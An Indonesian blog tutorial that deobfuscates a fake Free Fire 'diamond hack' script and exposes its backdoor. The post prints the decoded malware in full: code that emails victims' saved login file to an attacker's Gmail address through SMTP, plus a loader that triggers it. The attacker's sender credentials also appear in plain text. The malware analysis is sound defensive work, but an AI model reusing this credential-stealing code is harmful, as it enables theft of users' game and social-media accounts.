# Backdoor Pada Script FFHax


## Pendahuluan

Beberapa waktu yang lalu, saya sempat menemukan _backdoor_ pada sebuah script yang terdapat pada repositori di github. Script seperti itu pada umumnya digunakan oleh orang-orang yang termasuk ke dalam kategori _tuyulers_. Nama [repositori tersebut](https://github.com/mrdarkx/ffhax) adalah **ffhax** yang pada deskripsinya terdapat kalimat ini:

```
free fire diamond hack generator
```

Pada tutorial singkat kali ini, kita akan mempelajari backdoor yang dimiliki oleh script tersebut.


## Langkah-langkah

Pertama kita akan melakukan kloning repositori script tersebut:

```bash
% git clone https://github.com/mrdarkx/ffhax
```

Pindah ke sub direktori **ffhax**:

```bash
% cd ffhax
```

Perlu diperhatikan bahwa beberapa file pada repositori tersebut menggunakan titik sebagai karakter awal dari namanya, sehingga tidak akan terlihat pada sistem operasi berbasis Unix, termasuk Android. Berikut ini adalah cara melihat file tersebut:

```bash
% ls -Gga
total 10664
drwxrwxr-x.  4      160 Oct 27 08:02 .
drwxrwxrwt. 23      480 Oct 27 08:02 ..
drwxrwxr-x.  4      200 Oct 27 08:02 .assets
-rw-rw-r--.  1 10876874 Oct 27 08:02 ffhax.py
drwxrwxr-x.  8      260 Oct 27 08:02 .git
-rw-rw-r--.  1    15750 Oct 27 08:02 .i.py
-rw-rw-r--.  1    17807 Oct 27 08:02 ._.py
-rw-rw-r--.  1      173 Oct 27 08:02 README.md
```

Bisa terlihat bahwa terdapat dua file dengan titik pada awal namanya. Kita akan mengubah nama kedua file tersebut agar menjadi nama file normal.

```bash
% mv .i.py i.py
% mv ._.py _.py
```

Selanjutnya, kita akan melakukan analisis terhadap file **i.py**. Berikut ini adalah potongan isi dari file tersebut:

```python
# Folow github : https://github.com/Sazxt/comz
#Compile By Sazxt
#My Team : Black Coder Crush
import base64
exec(base64.b32decode("EMQEM33MN53SAZ3JO ... J5EIUSS==="))
```

Kita akan mengubah fungsi `exec` pada file tersebut menjadi `print`. Kita dapat melakukannya dengan menggunakan perintah `sed` seperti ini:

```bash
% sed -i 's/exec/print/' i.py
```

Lalu, kita jalankan script tersebut dan hasilnya kita simpan kembali ke file tersebut:

```bash
% python2 i.py > tmp && mv -f tmp i.py
```

Ternyata isinya masih diencode, seperti ini:

```python
# Folow github : https://github.com/Sazxt/comz
#Compile By Sazxt
#My Team : Black Coder Crush
import base64
exec(base64.b32decode("EMWS2LJNFU ... YGAZCOKI="))
```

Kita kembali akan mengganti `exec` menjadi `print` dan menjalankan script tersebut. Namun kali ini kita akan melakukan dengan menggabungkan perintah tersebut seperti ini:

```bash
% sed -i 's/exec/print/' i.py; python2 i.py > tmp && mv -f tmp i.py
```

Hasil dari perintah di atas adalah kurang lebih seperti ini:

```python
#------------------------------------------------------------------------------
# Obfuscate By Sazxt Thanks To Black Coder Crush
# github  : https://github.com/Sazxt/comz
# from Linux
# localhost : aarch64
# key : saz-bI6rN3iG8gE5sV3
# date : Wed Oct 14 18:32:26 2020
#------------------------------------------------------------------------------
import marshal
exec marshal.loads('c\x00\x00\x00\x00\x00 ... \x01\r\x01\x08\x02')
```

Kali ini kita akan mengedit langsung file tersebut yang selanjutnya akan menggunakan uncompyle6 untuk melakukan dekompilasi. Ubah script tersebut menjadi seperti ini:

```python
#------------------------------------------------------------------------------
# Obfuscate By Sazxt Thanks To Black Coder Crush
# github  : https://github.com/Sazxt/comz
# from Linux
# localhost : aarch64
# key : saz-bI6rN3iG8gE5sV3
# date : Wed Oct 14 18:32:26 2020
#------------------------------------------------------------------------------
import marshal
import sys
import uncompyle6
uncompyle6.main.decompile(2.7, marshal.loads('c\x00\x00\x00\x00\x00 ... \x01\r\x01\x08\x02'), sys.stdout)
```

Jalankan script tersebut dan simpan ke file sementara, lalu ubah nama file sementara tersebut kembali ke file **i.py** seperti ini:

```bash
% python2 i.py > tmp && mv -f tmp i.py
```

Hasil dekompilasinya adalah sebagai berikut:

```python
import os
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
msg = MIMEMultipart()
msg = MIMEMultipart()
message = 'Akun FF'
password = 'YnVrYWV1eWxhaA=='
msg['From'] = 'senderemail985@gmail.com'
msg['To'] = 'gamerztbr@gmail.com'
msg['Subject'] = 'dapat ikan'
msg.attach(MIMEText(message, 'plain'))
file = '.log.txt'
msg.attach(MIMEText(' Kalo gak FB ya VK'))
attachment = MIMEBase('application', 'octet-stream')
attachment.set_payload(open(file, 'rb').read())
encoders.encode_base64(attachment)
attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
msg.attach(attachment)
try:
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
    print 'login success'
    os.system('rm -rf log.txt')
except:
    print 'login gagal'
    os.system('exit')

print 'NB : GUNAKAN CHEAT INI SECUKUPNYA SAJA, JANGAN BERLEBIHAN'
print 'Cheat Ini kemungkinan Tidak Work di akun baru'
print '\nMenu :'
print '1. 100 Diamond (Aman)'
print '2. 500 Diamond (lumayan)'
print '3. 1000 Diamond (Beresiko)'
print '4. 2000 Diamond (Beresiko)'
try:
    select = int(raw_input('\x1b[0;30;47mpilih >> ' + '\x1b[0m '))
except ValueError:
    print 'pilihan salah!'

if select == 1:
    os.system('sleep 7')
    print 'injecting'
    os.system('sleep 5')
    print 'mengirim 100 diamond'
    os.system('sleep 10')
    print 'gagal!'
elif select == 2:
    os.system('sleep 7')
    print 'injecting ...'
    os.system('sleep 5')
    print 'mengirim 500 diamond...'
    os.system('sleep 10')
    print 'gagal!'
elif select == 3:
    os.system('sleep 7')
    print 'injecting ...'
    os.system('sleep 5')
    print 'mengirim 1000 diamond...'
    os.system('sleep 10')
    print 'gagal!'
elif select == 4:
    os.system('sleep 7')
    print 'injecting ...'
    os.system('sleep 5')
    print 'mengirim 2000 diamond...'
    os.system('sleep 10')
    print 'berhasil!'
else:
    print 'input salah'
```

Perhatikan bagian ini pada script di atas:

```python
msg = MIMEMultipart()
message = 'Akun FF'
password = 'YnVrYWV1eWxhaA=='
msg['From'] = 'senderemail985@gmail.com'
msg['To'] = 'gamerztbr@gmail.com'
msg['Subject'] = 'dapat ikan'
msg.attach(MIMEText(message, 'plain'))
file = '.log.txt'
msg.attach(MIMEText(' Kalo gak FB ya VK'))
```

Potongan kode tersebut akan mengirimkan informasi akun pengguna script tersebut yang terdapat pada file `.log.txt` melalui email kepada akun `gamerztbr@gmail.com` dengan _subject_ `dapat ikan`. Pembuat script backdoor tersebut akan mengirimkan file menggunakan akun `senderemail985@gmail.com` dan passwordnya di-encode menggunakan base64, yaitu `YnVrYWV1eWxhaA==`dan jika di-decode maka passwordnya adalah `bukaeuylah`.

Selanjutnya, kita akan men-deobfuscate file `_.py`. Caranya mirip dengan beberapa langkah di atas. Pada akhirnya kita akan menemukan script yang diobfuscate berikut ini:

```python
#------------------------------------------------------------------------------------------------------------------------------
# Obfuscate By Sazxt Thanks To Black Coder Crush
# github  : https://github.com/Sazxt/comz
# from Linux
# localhost : aarch64
# key : saz-mM5xT3pI7tY5yS4
# date : Wed Oct 14 18:30:45 2020
#------------------------------------------------------------------------------------------------------------------------------
import binascii
(lambda : (lambda __,___,____,_________ : __(___((lambda __ : ____('%x' % int(__, 2)))('0b1101001011011010111000001101111011100100111010000100000011011110111001100001010011100000111001001101001011011100111010000100000001010000010001001011100011011100111101101011100011110000011000101100010010110110011000000111011001100110011000000111011001101000011011101101101001000000010000001001101010001010100111001000111010001010100001101001000010001010100001101001011001000000100110001001111010001110100100101001110001000000101110001111000001100010110001001011011001100000110110101111101001000100010100100001010011101110110100001101001011011000110010100100000010101000111001001110101011001010011101000001010000010010110000100100000001111010010000001101111011100110010111001110000011000010111010001101000001011100110100101110011011001100110100101101100011001010010100000100010001011100110110001101111011001110010111001110100011110000111010000100010001010010000101000001001011010010110011000100000011000010010000000111101001111010010000001010100011100100111010101100101001110100000101000001001000010010110111101110011001011100111001101111001011100110111010001100101011011010010100000100010011100000111100101110100011010000110111101101110001100100010000000101110011010010010111001110000011110010010001000101001000010100000100100001001011000100111001001100101011000010110101100001010'),str(bytearray(((((((((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))+(((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))-((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)*((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))),(((((((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))+(((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))+((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)-((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))-((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))),((((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))+(((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)*((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))+((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))),(((((((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))+(((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))-((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))+(((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)-((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))),(((((((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)*((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize!=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))-((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)*((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))),((((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))+(((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))+(((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)*((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize!=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))+(((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize!=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))),((((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)-((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))-(((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)-((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)-((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals!=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))),))),(lambda _:_(map(chr,[(((((((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))<<((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))+((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))+((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))),(((((((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)-((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount!=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))+(((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))-((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)-((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))),(((((((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount<=(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))))+((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)))))<<((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))+((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))),(((((((((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount>=(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount!=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))+((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<=(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)-((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)))))<<((((lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount==(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals)+((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount))))-((((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize==(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize)*((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize>(lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals))))])))(((lambda:(((lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize<(lambda:_>>__<=_*{}>>_<=_).func_code.co_argcount)-((lambda:__^_|_&__*_<<_>_<<_).func_code.co_nlocals>(lambda:_<__+_*(_<<_)/_>>_).func_code.co_stacksize))).func_code.co_lnotab).join))))(eval,compile,binascii.unhexlify,globals().update({'Obfuscate':'By SAZXT'})))()
```

Jika script tersebut di-deobfuscate, maka hasilnya adalah seperti ini:

```python
import os
print ("\n{\x1b[0;30;47m  MENGECHECK LOGIN \x1b[0m}")
while True:
        a = os.path.isfile(".log.txt")
        if a == True:
                os.system("python2 .i.py")
                break
```

Jadi secara sederhana, script di atas akan melakukan _infinite loop_ dengan instruksi berikut ini:

* Memeriksa apakah terdapat file `.log.txt`
* Jika ada, maka script akan menjalankan script `.i.py`
* Script `.i.py` akan mengirimkan informasi login user pada pembuat script

Itulah salah satu alasan kenapa saya sering menulis tutorial mengenai script yang dipakai para _tuyulers_. Karena saya berpikir, kebanyakan dari mereka tidak mengerti apa yang mereka gunakan. Bahkan ada cukup banyak script yang sebenarnya dibuat asal-asalan dengan menggabungkan alias _copy-paste_ dari script lain. Hal tersebut akan saya tulis di lain kesempatan.


## Penutup

Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
